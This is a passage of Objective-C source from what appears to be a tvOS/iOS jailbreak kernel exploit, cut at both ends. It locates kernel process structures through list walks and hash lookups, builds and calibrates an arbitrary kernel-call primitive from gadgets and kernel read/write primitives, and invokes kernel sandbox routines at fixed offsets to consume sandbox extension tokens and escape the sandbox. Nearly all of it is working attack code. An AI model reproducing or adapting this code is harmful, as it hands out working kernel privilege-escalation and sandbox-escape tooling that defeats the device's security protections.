    uint64_t proc = kread_ptr(sentinel_kva + koffsetof(proc, list_next));
    for (int step = 0; proc && step < 4096; step++) {
        if (!dt1025_kernel_range_kptr(proc))
            break;
        if (dt1025_proc_kptr_pid_match(proc, pid, expect_ppid))
            return proc;
        proc = kread_ptr(proc + koffsetof(proc, list_next));
    }
    return 0;
}

static uint64_t dt1025_proc_find_kernproc_walk(pid_t pid, pid_t expect_ppid, void (^log)(NSString *line))
{
    uint64_t head = dt_kernel_exploit_kernel_proc();
    if (!head) {
        dt1025_log(log, @"[*] build102.6.23 kernproc walk skip head=0");
        return 0;
    }
    if (!dt1025_kernel_range_kptr(head)) {
        dt1025_log(log, @"[!] build102.6.23 kernproc walk head not kernel-range head=0x%llx",
            (unsigned long long)head);
        return 0;
    }

    uint64_t proc = head;
    for (int step = 0; proc && step < 4096; step++) {
        if (!dt1025_kernel_range_kptr(proc))
            break;
        if (dt1025_proc_kptr_pid_match(proc, pid, expect_ppid))
            return proc;
        proc = kread_ptr(proc + koffsetof(proc, list_prev));
    }
    return 0;
}

static uint64_t dt1025_proc_resolve_ida(pid_t pid, pid_t expect_ppid, void (^log)(NSString *line),
    const char **method_out)
{
    uint64_t proc = 0;
    const char *method = NULL;

    proc = dt1025_proc_find_hash_ida(pid, expect_ppid);
    if (proc)
        method = "hash_ida";

    if (!proc) {
        proc = dt1025_proc_find_kernproc_walk(pid, expect_ppid, log);
        if (proc)
            method = "kernproc_walk";
    }

    if (!proc) {
        proc = dt1025_proc_find_sentinel_list(pid, dt1025_kva(kDTUnslidAllprocZombieSentinel), expect_ppid);
        if (proc)
            method = "zombie_list";
    }

    if (!proc) {
        proc = proc_find(pid);
        if (proc && dt1025_proc_kptr_pid_match(proc, pid, expect_ppid))
            method = "libjailbreak_allproc";
        else
            proc = 0;
    }

    if (method_out)
        *method_out = method;
    return proc;
}

static uint64_t dt1025_broker_proc_resolve(pid_t app_pid, pid_t broker_pid, void (^log)(NSString *line),
    int *attempts_out, int *alive_fail_out)
{
    static const int kMaxAttempts = 10;
    static const useconds_t kRetryUs = 10000;

    dt1025_stage(@"build102.6.23 KCALL623_PHASE1_PROC_RESOLUTION_VALIDATOR_FIX");

    const char *app_method = NULL;
    uint64_t app_ctrl = dt1025_proc_resolve_ida(app_pid, -1, log, &app_method);
    BOOL app_non_lj = dt1025_proc_resolve_method_non_libjailbreak(app_method);
    dt1025_log(log, @"[*] build102.6.23 control proc_resolve(app_pid=%d)=0x%llx method=%s non_lj=%d",
        (int)app_pid,
        (unsigned long long)app_ctrl,
        app_method ? app_method : "?",
        app_non_lj ? 1 : 0);
    if (app_ctrl)
        proc_rele(app_ctrl);

    if (!app_ctrl || !app_non_lj) {
        dt1025_log(log, @"[!] build102.6.23 app control failed proc=0x%llx method=%s (need non-libjailbreak path)",
            (unsigned long long)app_ctrl, app_method ? app_method : "?");
        dt1025_stage(@"build102.6.23 KCALL623_PHASE1_PROC_RESOLUTION_VALIDATOR_FAIL_APP_CONTROL");
        if (attempts_out)
            *attempts_out = 0;
        if (alive_fail_out)
            *alive_fail_out = 0;
        return 0;
    }

    dt1025_stage(@"build102.6.23 KCALL623_PHASE1_PROC_RESOLVE_IDA");

    uint64_t broker_proc = 0;
    const char *broker_method = NULL;
    int attempts = 0;
    int alive_fail = 0;

    for (int attempt = 0; attempt < kMaxAttempts; attempt++) {
        attempts = attempt + 1;
        if (kill(broker_pid, 0) != 0) {
            alive_fail = 1;
            dt1025_log(log, @"[!] build102.6.23 broker liveness lost attempt=%d pid=%d errno=%d",
                attempt + 1, (int)broker_pid, errno);
            break;
        }

        uint64_t lj_proc = proc_find(broker_pid);
        uint64_t hash_proc = dt1025_proc_find_hash_ida(broker_pid, app_pid);
        uint64_t walk_proc = dt1025_proc_find_kernproc_walk(broker_pid, app_pid, log);
        broker_proc = dt1025_proc_resolve_ida(broker_pid, app_pid, log, &broker_method);

        dt1025_log(log, @"[*] build102.6.23 proc resolve attempt=%d alive=1 lj=0x%llx hash=0x%llx walk=0x%llx resolved=0x%llx method=%s",
            attempt + 1,
            (unsigned long long)lj_proc,
            (unsigned long long)hash_proc,
            (unsigned long long)walk_proc,
            (unsigned long long)broker_proc,
            broker_method ? broker_method : "?");

        if (broker_proc)
            dt1025_log(log, @"[*] build102.6.23 KCALL622_BROKER_PROC_IDA_RESOLVED pid=%d method=%s ppid_expect=%d",
                (int)broker_pid, broker_method ? broker_method : "?", (int)app_pid);

        if (broker_proc)
            break;

        if (attempt + 1 < kMaxAttempts)
            usleep(kRetryUs);
    }

    if (attempts_out)
        *attempts_out = attempts;
    if (alive_fail_out)
        *alive_fail_out = alive_fail;

    return broker_proc;
}

/// BUILD102592 Strategy B + BUILD10252 M6 — fail closed before any kcall dispatch.
/// IDA: kcall_return STR X0,[X19] @ 0xFFFFFFF005DE1E90 requires canonical kernel scratch/stack KVAs.
static int dt1025_kcall_m4_gate(void (^log)(NSString *line), NSString **failVerdictOut, BOOL require_m6)
{
    dt_tvos_kcall_debug_t kd = {0};
    dt_tvos_kcall_get_debug(&kd);

    if (!dt102592_kva_canonical(kd.kernel_stack_kva)) {
        dt1025_log(log, @"[!] build102.5.94 M4 gate FAIL kernelStack=0x%llx scratch=0x%llx stack_page=0x%llx",
            (unsigned long long)kd.kernel_stack_kva,
            (unsigned long long)kd.scratch_kva,
            (unsigned long long)kd.stack_page_base);
        dt1025_set_verdict(failVerdictOut, @"KCALL_ALLOC_STACK_KVA_FAIL");
        return -4;
    }
    if (!dt102592_kva_canonical(kd.scratch_kva)) {
        dt1025_log(log, @"[!] build102.5.94 M4 gate FAIL scratch=0x%llx stack_page=0x%llx",
            (unsigned long long)kd.scratch_kva,
            (unsigned long long)kd.stack_page_base);
        dt1025_set_verdict(failVerdictOut, @"KCALL_ALLOC_SCRATCH_KVA_FAIL");
        return -5;
    }

    uint64_t target_sp = kd.kernel_stack_kva - 0x20ULL;
    BOOL m4c = (kd.kernel_stack_kva & 0x3FFFULL) == 0;
    BOOL m4d = (kd.scratch_kva & 0x3FFFULL) == 0;
    if (!m4c || !m4d) {
        dt1025_set_verdict(failVerdictOut, @"KCALL_ALLOC_ALIGN_FAIL");
        return -6;
    }

    BOOL m4_sent_scratch = dt102592_sentinel_rw(kd.scratch_kva);
    BOOL m4_sent_sp = dt102592_sentinel_rw(target_sp);
    kwrite64(kd.scratch_kva, 0);
    kwrite64(target_sp, 0);
    if (!m4_sent_scratch || !m4_sent_sp) {
        dt1025_log(log, @"[!] build102.5.94 M4-pre sentinel scratch=%d target_sp=%d FAIL",
            m4_sent_scratch ? 1 : 0, m4_sent_sp ? 1 : 0);
        dt1025_set_verdict(failVerdictOut, @"KCALL_ALLOC_SENTINEL_FAIL");
        return -8;
    }

    dt1025_log(log, @"[*] build102.5.94 M4-init stack_page=0x%llx kernelStack=0x%llx scratch=0x%llx target_sp=0x%llx",
        (unsigned long long)kd.stack_page_base,
        (unsigned long long)kd.kernel_stack_kva,
        (unsigned long long)kd.scratch_kva,
        (unsigned long long)target_sp);

    if (!require_m6)
        return 0;

    if (!kd.thread_kptr || !dt1025_kernel_range_kptr(kd.thread_kptr)) {
        dt1025_log(log, @"[!] build102.5.2 M6 thread kptr not kernel-range 0x%llx (align=0x%llx)",
            (unsigned long long)kd.thread_kptr,
            (unsigned long long)(kd.thread_kptr & 0x3FFFULL));
        dt1025_set_verdict(failVerdictOut, @"KCALL_THREAD_OFFSETS_FAIL");
        return -9;
    }

    if (!kd.act_context_kptr || !dt1025_kernel_range_kptr(kd.act_context_kptr)) {
        dt1025_log(log, @"[!] build102.5.2 M6 act context not kernel-range 0x%llx",
            (unsigned long long)kd.act_context_kptr);
        dt1025_set_verdict(failVerdictOut, @"KCALL_THREAD_OFFSETS_FAIL");
        return -9;
    }

    uint64_t act_live = kread_ptr(kd.thread_kptr + koffsetof(thread, machine_contextData));
    if (!act_live || act_live != kd.act_context_kptr) {
        dt1025_log(log, @"[!] build102.5.2 M6 thread+0xF0=0x%llx act_init=0x%llx FAIL",
            (unsigned long long)act_live,
            (unsigned long long)kd.act_context_kptr);
        dt1025_set_verdict(failVerdictOut, @"KCALL_THREAD_OFFSETS_FAIL");
        return -9;
    }

    dt1025_log(log, @"[*] build102.5.2 M6 thread+0xF0=0x%llx act_init=0x%llx OK thread=0x%llx",
        (unsigned long long)act_live,
        (unsigned long long)kd.act_context_kptr,
        (unsigned long long)kd.thread_kptr);

    uint64_t kstack_live = kread_ptr(kd.thread_kptr + koffsetof(thread, machine_kstackptr));
    dt1025_log(log, @"[*] build102.5.2 M5-pre thread+0x130=0x%llx expect_kernelStack=0x%llx",
        (unsigned long long)kstack_live,
        (unsigned long long)kd.kernel_stack_kva);

    return 0;
}

static int dt1025_kcall_init(void (^log)(NSString *line))
{
    g_dt1025_last_kcall_verdict = nil;

    if (!g_dt_baked_offsets_active) {
        dt1025_log(log, @"[!] build102.5.2 kcall: baked offsets inactive");
        return -1;
    }
    if (!gPrimitives.physreadbuf || !gPrimitives.physwritebuf) {
        dt1025_log(log, @"[!] build102.5.2 kcall: phys primitives missing");
        return -2;
    }

    libjailbreak_kalloc_pt_init();
    if (!gPrimitives.kalloc_global) {
        dt1025_log(log, @"[!] build102.5.2 kcall: kalloc_global_pt missing");
        return -3;
    }
    if (!gPrimitives.kalloc_local)
        gPrimitives.kalloc_local = gPrimitives.kalloc_global;

    if (kalloc_pt_pool_count() < 2) {
        unsigned need = 2 - kalloc_pt_pool_count();
        int seeded = kalloc_pt_prefill(need);
        dt1025_log(log, @"[*] build102.5.94 kalloc_pt prefill seeded=%d pool=%u (Strategy B needs 2x0x4000)",
            seeded, kalloc_pt_pool_count());
        if (seeded < 0 || (unsigned)seeded < need || kalloc_pt_pool_count() < 2) {
            dt1025_stage(@"KALLOC_PT_PREFILL_FAIL");
            g_dt1025_last_kcall_verdict = @"KCALL_ALLOC_STACK_KVA_FAIL";
            return -8;
        }
        dt1025_stage(@"KALLOC_PT_PREFILL_OK");
    } else {
        dt1025_stage(@"KALLOC_PT_PREFILL_OK");
    }

    if (dt1025_kalloc_pt_smoke(log) != 0) {
        g_dt1025_last_kcall_verdict = @"KCALL_ALLOC_STACK_KVA_FAIL";
        return -8;
    }

    uint64_t slide = gSystemInfo.kernelConstant.slide;
    dt1025_log(log, @"[*] build102.5.94 KCALL592 Strategy B allocator (two x0x4000 kalloc_pt pages, separate scratch)");
    dt1025_log(log, @"[*] build102.5.94 KCALL591 handoff retained (str_x8_x0: X0=&kstackptr X8=kernelStack)");
    dt1025_log(log, @"[*] build102.5.94 Fix-A kernel-scratch return (IDA kcall_return STR X0,[X19])");
    dt1025_log(log, @"[*] build102.5.94 KCALL594 wait-sync (extern volatile gUserReturnDidHappen; spin before suspend)");
    dt1025_log(log, @"[*] build102.5.2 kcall gadgets slide=0x%llx str_x8_x0=0x%llx kcall_return=0x%llx exception_return=0x%llx",
        slide,
        (unsigned long long)kgadget(str_x8_x0),
        (unsigned long long)kgadget(kcall_return),
        (unsigned long long)ksymbol(exception_return));
    dt1025_log(log, @"[*] build102.5.2 thread offsets contextData=0x%x kstackptr=0x%x proc.pid=0x%x",
        koffsetof(thread, machine_contextData),
        koffsetof(thread, machine_kstackptr),
        koffsetof(proc, pid));

    if (!kgadget(str_x8_x0) || !kgadget(kcall_return) || !ksymbol(exception_return)) {
        dt1025_log(log, @"[!] build102.5.2 kcall: gadget/symbol VA zero");
        return -4;
    }
    if (!koffsetof(thread, machine_contextData) || !koffsetof(thread, machine_kstackptr)) {
        dt1025_log(log, @"[!] build102.5.2 kcall: thread offsets zero");
        return -5;
    }

    int init_r = arm64_kcall_init();
    if (init_r != 0 || !gPrimitives.kcall) {
        dt1025_log(log, @"[!] build102.5.2 arm64_kcall_init failed (%d) kcall=%p", init_r, gPrimitives.kcall);
        if (init_r == -21)
            g_dt1025_last_kcall_verdict = @"KCALL_ALLOC_STACK_KVA_FAIL";
        else
            g_dt1025_last_kcall_verdict = @"KCALL681_KCALL_INIT_FAIL";
        return -6;
    }

    NSString *m4_fail = nil;
    if (dt1025_kcall_m4_gate(log, &m4_fail, YES) != 0) {
        dt1025_log(log, @"[!] build102.5.94 kcall init M4/M6 gate FAIL %@", m4_fail ?: @"");
        g_dt1025_last_kcall_verdict = m4_fail ?: @"KCALL681_KCALL_INIT_FAIL";
        return -7;
    }

    dt_tvos_kcall_debug_t kd = {0};
    dt_tvos_kcall_get_debug(&kd);
    dt1025_log(log, @"[+] build102.5.94 kcall init OK stack_page=0x%llx kernelStack=0x%llx scratch=0x%llx thread=0x%llx act=0x%llx",
        (unsigned long long)kd.stack_page_base,
        (unsigned long long)kd.kernel_stack_kva,
        (unsigned long long)kd.scratch_kva,
        (unsigned long long)kd.thread_kptr,
        (unsigned long long)kd.act_context_kptr);
    return 0;
}

static BOOL dt10252_bytes_match(const uint8_t *got, const uint8_t *expect, size_t n)
{
    return memcmp(got, expect, n) == 0;
}

/// M1–M6 calibration (BUILD10252_KCALL_IDA_FULL_TRACE.txt). Returns 0 if all pass.
static int dt10252_run_calibration(uint64_t proc_kptr, void (^log)(NSString *line), NSString **failVerdictOut)
{
    int upid = getpid();
    BOOL m1 = NO, m2 = NO, m4a = NO, m4b = NO, m4c = NO, m4d = NO, m4e = NO, m4_pre = NO, m6 = NO;

    /* M1 — proc+0x60 == getpid (IDA: _proc_pid LDR W0,[X1,#0x60]) */
    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    m1 = (proc_pid_field == (uint32_t)upid);
    dt1025_log(log, @"[*] build102.5.2 M1 proc+0x%x=0x%x getpid=%d %@",
        koffsetof(proc, pid), proc_pid_field, upid, m1 ? @"OK" : @"FAIL");
    if (!m1) {
        if (failVerdictOut) *failVerdictOut = @"KCALL_PROC_KPTR_FAIL";
        return -1;
    }

    /* M2 — target VA prologue bytes @ slid _proc_pid */
    uint64_t func = dt1025_kva(kDTUnslidProcPid);
    uint8_t live[16] = {0};
    if (kreadbuf(func, live, sizeof(live)) != 0) {
        dt1025_log(log, @"[!] build102.5.2 M2 kreadbuf failed @ 0x%llx", (unsigned long long)func);
        if (failVerdictOut) *failVerdictOut = @"KCALL_TARGET_VA_FAIL";
        return -2;
    }
    m2 = dt10252_bytes_match(live, kDTProcPidPrologue, sizeof(kDTProcPidPrologue));
    dt1025_log(log, @"[*] build102.5.2 M2 target VA 0x%llx prologue %@ (IDA 75E4F88)",
        (unsigned long long)func, m2 ? @"OK" : @"FAIL");
    if (!m2) {
        dt1025_log(log, @"[!] build102.5.2 M2 live=%02x%02x%02x%02x expect=%02x%02x%02x%02x",
            live[0], live[1], live[2], live[3],
            kDTProcPidPrologue[0], kDTProcPidPrologue[1], kDTProcPidPrologue[2], kDTProcPidPrologue[3]);
        if (failVerdictOut) *failVerdictOut = @"KCALL_TARGET_VA_FAIL";
        return -3;
    }

    /* M4 + M6 — Strategy B backing + thread act (BUILD102592 / BUILD10252) */
    int m4_gate_r = dt1025_kcall_m4_gate(log, failVerdictOut, YES);
    if (m4_gate_r != 0)
        return m4_gate_r;
    m4a = m4b = m4c = m4d = m4e = m4_pre = m6 = YES;

    (void)m4a;
    (void)m4b;
    (void)m4c;
    (void)m4d;
    (void)m4e;
    (void)m4_pre;
    (void)m6;
    return 0;
}

static int dt1025_kcall_proc_pid_probe(uint64_t proc_kptr, void (^log)(NSString *line), int *pid_out,
    BOOL *m3_ok, BOOL *m4_ok, BOOL *m5_ok, BOOL *m7_ok)
{
    uint64_t func = dt1025_kva(kDTUnslidProcPid);
    uint64_t argv_app[] = { proc_kptr };
    uint64_t argv_null[] = { 0 };
    uint64_t ret_app = 0, ret_null = 0;

    dt_tvos_kcall_debug_t kd = {0};
    dt_tvos_kcall_get_debug(&kd);
    uint64_t scratch_before = kread64(kd.scratch_kva);

    dt1025_log(log, @"[*] build102.5.94 stage1 kcall(proc_pid,app_proc) proc=0x%llx func=0x%llx scratch=0x%llx",
        (unsigned long long)proc_kptr, (unsigned long long)func, (unsigned long long)kd.scratch_kva);

    if (kcall(&ret_app, func, 1, argv_app) != 0) {
        dt1025_log(log, @"[!] build102.5.94 stage1 kcall dispatch failed (app_proc)");
        return -1;
    }

    int kpid = (int)(uint32_t)ret_app;
    int upid = getpid();
    uint64_t scratch_after = kread64(kd.scratch_kva);

    dt1025_log(log, @"[*] build102.5.94 stage1 proc_pid kcall=%d getpid=%d match=%d scratch_before=0x%llx scratch_after=0x%llx kread_scratch=%d",
        kpid, upid, kpid == upid ? 1 : 0,
        (unsigned long long)scratch_before,
        (unsigned long long)scratch_after,
        (int)(uint32_t)scratch_after);

    if (pid_out)
        *pid_out = kpid;

    /* M3 — arg semantics */
    if (m3_ok)
        *m3_ok = (kpid == upid);

    /* M4 — return landed in kernel scratch */
    if (m4_ok)
        *m4_ok = (scratch_after == (uint64_t)(uint32_t)upid) && (kpid == upid);

    /* M5 — post-return kstackptr diagnostic only (BUILD10255; not a gate) */
    if (kd.thread_kptr) {
        uint64_t kstack_live = kread_ptr(kd.thread_kptr + koffsetof(thread, machine_kstackptr));
        BOOL m5_match = (kstack_live == kd.kernel_stack_kva);
        if (m5_ok)
            *m5_ok = m5_match;
        dt1025_log(log, @"[*] build102.5.94 M5 diag thread+0x130=0x%llx kernelStack=0x%llx match=%d",
            (unsigned long long)kstack_live,
            (unsigned long long)kd.kernel_stack_kva,
            m5_match ? 1 : 0);
    }

    /* M7 — bootstrap side-effect fingerprint (590/590B) */
    if (kd.kernel_stack_kva) {
        uint64_t m7a = kread64(kd.kernel_stack_kva);
        uint64_t m7b = kread64(kd.kernel_stack_kva - 0x20ULL);
        uint64_t m7c = kd.thread_kptr
            ? kread_ptr(kd.thread_kptr + koffsetof(thread, machine_kstackptr)) : 0;
        uint64_t fp_target = kd.thread_kptr
            ? (kd.thread_kptr + koffsetof(thread, machine_kstackptr)) : 0;
        BOOL inverted_fp = fp_target && (m7a == fp_target);
        if (m7_ok)
            *m7_ok = !inverted_fp;
        dt1025_log(log, @"[*] build102.5.94 M7a kernelStack_mem=0x%llx M7b target_sp_slot=0x%llx",
            (unsigned long long)m7a, (unsigned long long)m7b);
        dt1025_log(log, @"[*] build102.5.94 M7c thread+0x130=0x%llx inverted_fingerprint=%d expect_fp=0 %@",
            (unsigned long long)m7c, inverted_fp ? 1 : 0, inverted_fp ? @"FAIL" : @"OK");
    }

    /* M3b — NULL proc → -1 (IDA 75E5000 MOV W0,#0xFFFFFFFF) */
    if (kcall(&ret_null, func, 1, argv_null) != 0) {
        dt1025_log(log, @"[!] build102.5.94 M3b kcall(proc_pid,NULL) dispatch failed");
    } else {
        int kpid_null = (int)(uint32_t)ret_null;
        dt1025_log(log, @"[*] build102.5.94 M3b kcall(proc_pid,NULL)=%d expect=-1 %@",
            kpid_null, kpid_null == -1 ? @"OK" : @"FAIL");
        if (m3_ok && kpid_null != -1)
            *m3_ok = NO;
    }

    return (kpid == upid) ? 0 : -2;
}

typedef struct {
    mach_vm_address_t token_ptr;
    mach_vm_size_t token_len_plus1;
    mach_vm_address_t handle_out_ptr;
} dt_consume_mig_args_t;

/* Kernel 53D540: copyin 0x18 @ 53D5B0 — name_ptr, ext_ptr, ext_len (BUILD102604 gate) */
typedef struct {
    mach_vm_address_t name_ptr;
    mach_vm_address_t ext_ptr;
    mach_vm_size_t ext_len;
} dt_sandbox_apply_bundle_t;

static const char kDT604BuiltinProfileName[] = "cfprefsd";

static int dt1025_kcall_53d540(uint64_t proc_kptr, const dt_sandbox_apply_bundle_t *bundle,
    void (^log)(NSString *line), int *kern_ret_out)
{
    uint64_t func = dt1025_kva(kDTUnslidSandboxApply53D540);
    uint64_t argv[] = { proc_kptr, (uint64_t)(uintptr_t)bundle };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build102.6.05 kcall(53D540) proc=0x%llx func=0x%llx bundle=0x%llx name_ptr=0x%llx ext_ptr=0x%llx ext_len=%llu",
        (unsigned long long)proc_kptr,
        (unsigned long long)func,
        (unsigned long long)(uintptr_t)bundle,
        (unsigned long long)(uintptr_t)bundle->name_ptr,
        (unsigned long long)(uintptr_t)bundle->ext_ptr,
        (unsigned long long)bundle->ext_len);

    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build102.6.05 kcall(53D540) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }

    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;

    dt1025_log(log, @"[*] build102.6.05 kcall(53D540) kern_ret=%d", (int)(uint32_t)kret);
    return 0;
}

static int64_t dt1025_kcall_consume_token(uint64_t proc_kptr, const char *token,
    void (^log)(NSString *line), int *kern_ret_out)
{
    int64_t handle_out = 0;
    dt_consume_mig_args_t args = {
        .token_ptr = (mach_vm_address_t)(uintptr_t)token,
        .token_len_plus1 = (mach_vm_size_t)(strlen(token) + 1),
        .handle_out_ptr = (mach_vm_address_t)(uintptr_t)&handle_out,
    };

    uint64_t func = dt1025_kva(kDTUnslidSandboxConsume55106C);
    uint64_t argv[] = { proc_kptr, (uint64_t)(uintptr_t)&args };
    uint64_t kret = 0;

    dt1025_log(log, @"[*] build102.5 kcall(55106C) proc=0x%llx func=0x%llx args=0x%llx tok_len=%zu",
        (unsigned long long)proc_kptr,
        (unsigned long long)func,
        (unsigned long long)(uintptr_t)&args,
        (size_t)args.token_len_plus1 - 1);

    if (kcall(&kret, func, 2, argv) != 0) {
        dt1025_log(log, @"[!] build102.5 kcall(55106C) dispatch failed");
        if (kern_ret_out)
            *kern_ret_out = -1;
        return -1;
    }

    if (kern_ret_out)
        *kern_ret_out = (int)(uint32_t)kret;

    dt1025_log(log, @"[*] build102.5 kcall(55106C) kern_ret=%d handle_out=%lld",
        (int)(uint32_t)kret, (long long)handle_out);
    return handle_out;
}

static char *dt1025_issue_token(const char *class, void (^log)(NSString *line))
{
    void *lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
    if (!lib) {
        dt1025_log(log, @"[!] build102.5 dlopen libsystem_sandbox: %s", dlerror() ?: "?");
        return NULL;
    }
    char *(*issue_file)(const char *, const char *, uint32_t) =
        dlsym(lib, "sandbox_extension_issue_file");
    if (!issue_file) {
        dt1025_log(log, @"[!] build102.5 dlsym issue_file failed");
        dlclose(lib);
        return NULL;
    }

    errno = 0;
    char *token = issue_file(class, kDTJbPath, 0);
    int issue_errno = errno;
    if (!token) {
        dt1025_log(log, @"[!] build102.5 issue class=%s errno=%d", class, issue_errno);
        dlclose(lib);
        return NULL;
    }

    dt1025_log(log, @"[*] build102.5 issue OK class=%s token_len=%zu flags=0", class, strlen(token));
    dlclose(lib);
    return token;
}

static char *dt1025_issue_token_path(const char *class, const char *path, void (^log)(NSString *line))
{
    if (!class || !path || !path[0]) {
        dt1025_log(log, @"[!] build102.6.29 issue_token_path bad args");
        return NULL;
    }
    if (path[strlen(path) - 1] == '/') {
        dt1025_log(log, @"[!] build102.6.29 issue rejected trailing-slash path=%s", path);
        return NULL;
    }

    void *lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
    if (!lib) {
        dt1025_log(log, @"[!] build102.6.29 dlopen libsystem_sandbox: %s", dlerror() ?: "?");
        return NULL;
    }
    char *(*issue_file)(const char *, const char *, uint32_t) =
        dlsym(lib, "sandbox_extension_issue_file");
    if (!issue_file) {
        dt1025_log(log, @"[!] build102.6.29 dlsym issue_file failed");
        dlclose(lib);
        return NULL;
    }

    errno = 0;
    char *token = issue_file(class, path, 0);
    int issue_errno = errno;
    if (!token) {
        dt1025_log(log, @"[!] build102.6.29 issue class=%s path=%s errno=%d", class, path, issue_errno);
        dlclose(lib);
        return NULL;
    }

    dt1025_log(log, @"[*] build102.6.29 issue OK class=%s path=%s token_len=%zu flags=0",
        class, path, strlen(token));
    dlclose(lib);
    return token;
}

static unsigned dt1025_sandbox_class_bucket_idx(const char *class_cstr)
{
    unsigned h = 5381U;
    for (const unsigned char *p = (const unsigned char *)class_cstr; *p; p++)
        h = 33U * h + (unsigned)*p;
    return h % 9U;
}

typedef struct {
    unsigned bucket_idx;
    uint64_t ext_container;
    uint64_t bucket_head;
    BOOL class_bucket_present;
    uint64_t handle_count;
    uint64_t bucket_heads[9];
    uint64_t record_head;
    uint8_t rec_attached;
    uint64_t rec_path_ptr;
    char rec_path_buf[256];
} dt1025_plus8_mirror_snap_t;

static void dt1025_plus8_mirror_walk_records(dt1025_plus8_mirror_snap_t *snap,
    const char *target_path, void (^log)(NSString *line), const char *tag)
{
    if (!snap->class_bucket_present || !snap->record_head)
        return;
    if (!dt1025_kernel_range_kptr(snap->record_head))
        return;

    uint64_t rec = snap->record_head;
    for (int walk_limit = 32; rec && dt1025_kernel_range_kptr(rec) && walk_limit-- > 0; ) {
        uint8_t attached = kread8(rec + 53);
        uint64_t path_ptr = kread64(rec + 64);
        NSString *path_str = dt1025_kread_cstring_krange(path_ptr, 256);
        dt1025_log(log, @"[*] build102.6.29 %s rec=0x%llx attached=%u path_ptr=0x%llx path=%@",
            tag,
            (unsigned long long)rec,
            (unsigned)attached,
            (unsigned long long)path_ptr,
            path_str ?: @"(unreadable)");
        if (attached == 1) {
            snap->rec_attached = 1;
            snap->rec_path_ptr = path_ptr;
            if (path_str.length)
                strlcpy(snap->rec_path_buf, path_str.UTF8String, sizeof(snap->rec_path_buf));
            if (target_path && path_str && ![path_str isEqualToString:@(target_path)]) {
                dt1025_log(log, @"[*] build102.6.29 %s rec path mismatch expected=%s got=%@",
                    tag, target_path, path_str);
            }
            break;
        }
        rec = kread64(rec);
    }
}

static void dt1025_plus8_mirror_read(uint64_t profile_ptr, const char *target_class,
    dt1025_plus8_mirror_snap_t *snap, void (^log)(NSString *line), const char *tag,
    BOOL walk_records, const char *target_path)
{
    memset(snap, 0, sizeof(*snap));
    snap->bucket_idx = dt1025_sandbox_class_bucket_idx(target_class);

    dt1025_log(log, @"[*] build102.6.29 %s profile_ptr=0x%llx bucket_idx=%u class=%s",
        tag,
        (unsigned long long)profile_ptr,
        snap->bucket_idx,
        target_class);

    if (!profile_ptr || profile_ptr == (uint64_t)-1LL || !dt1025_kernel_range_kptr(profile_ptr)) {
        dt1025_log(log, @"[*] build102.6.29 %s profile unreadable — ext_container=N/A", tag);
        return;
    }

    snap->ext_container = kread64(profile_ptr + 8);
    dt1025_log(log, @"[*] build102.6.29 %s profile+8 ext_container=0x%llx",
        tag, (unsigned long long)snap->ext_container);

    if (!snap->ext_container || !dt1025_kernel_range_kptr(snap->ext_container)) {
        dt1025_log(log, @"[*] build102.6.29 %s ext_container null — bucket=N/A handle_count=N/A",
            tag);
        return;
    }

    snap->handle_count = kread64(snap->ext_container + 0x90);
    for (unsigned i = 0; i < 9; i++)
        snap->bucket_heads[i] = kread64(snap->ext_container + 8ULL * (uint64_t)i);
    snap->bucket_head = snap->bucket_heads[snap->bucket_idx];

    dt1025_log(log, @"[*] build102.6.29 %s bucket_head=0x%llx handle_count=0x%llx",
        tag,
        (unsigned long long)snap->bucket_head,
        (unsigned long long)snap->handle_count);
    for (unsigned i = 0; i < 9; i++) {
        dt1025_log(log, @"[*] build102.6.29 %s bucket_heads[%u]=0x%llx",
            tag, i, (unsigned long long)snap->bucket_heads[i]);
    }

    uint64_t node = snap->bucket_head;
    for (int walk_limit = 32; node && dt1025_kernel_range_kptr(node) && walk_limit-- > 0; ) {
        uint64_t class_ptr = kread64(node + 16);
        NSString *class_name = dt1025_kread_cstring_krange(class_ptr, 128);
        if (class_name && [class_name isEqualToString:@(target_class)]) {
            snap->class_bucket_present = YES;
            snap->record_head = kread64(node + 8);
            dt1025_log(log, @"[*] build102.6.29 %s class_bucket_present=1 node=0x%llx record_head=0x%llx",
                tag,
                (unsigned long long)node,
                (unsigned long long)snap->record_head);
            break;
        }
        node = kread64(node);
    }

    if (!snap->class_bucket_present)
        dt1025_log(log, @"[*] build102.6.29 %s class_bucket_present=0", tag);

    if (walk_records)
        dt1025_plus8_mirror_walk_records(snap, target_path, log, tag);
}

static BOOL dt1025_consume_all_handles(uint64_t proc_kptr, void (^log)(NSString *line),
    int64_t handles_out[3])
{
    struct {
        const char *class;
        const char *label;
    } classes[] = {
        { kDTClassRead, "read" },
        { kDTClassRW, "rw" },
        { kDTClassExec, "executable" },
    };

    BOOL any_kcall_fail = NO;
    for (size_t i = 0; i < sizeof(classes) / sizeof(classes[0]); i++) {
        char *token = dt1025_issue_token(classes[i].class, log);
        if (!token)
            return NO;

        int kern_ret = 0;
        handles_out[i] = dt1025_kcall_consume_token(proc_kptr, token, log, &kern_ret);
        dt1025_log(log, @"[*] build102.5.1 consume %@ handle=%lld kern_ret=%d",
            @(classes[i].label), (long long)handles_out[i], kern_ret);
        free(token);

        if (handles_out[i] < 0)
            any_kcall_fail = YES;
    }

    return !any_kcall_fail;
}

static BOOL dt1025_handles_all_positive(const int64_t handles[3])
{
    return handles[0] > 0 && handles[1] > 0 && handles[2] > 0;
}

static int dt1025_run_runtime_slot_mirror(pid_t pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_log(log, @"[*] build102.5.98 KCALL598_RUNTIME_SLOT_PROFILE_MIRROR begin pid=%d",
        (int)pid);
    dt1025_stage(@"build102.5.98 KCALL598_KCALL_SAFE_PROBE_OK_CONFIRMED");

    dt1025_sandbox_chain_t chain = { 0 };
    int chain_r = dt1025_chain_for_pid(pid, &chain, log);
    if (chain_r != 0) {
        dt1025_log(log, @"[!] build102.5.98 chain log failed r=%d", chain_r);
        dt1025_set_verdict(verdictOut, @"KCALL598_CHAIN_LOG_FAIL");
        dt1025_stage(@"build102.5.98 KCALL598_CHAIN_LOG_FAIL");
        return -5;
    }

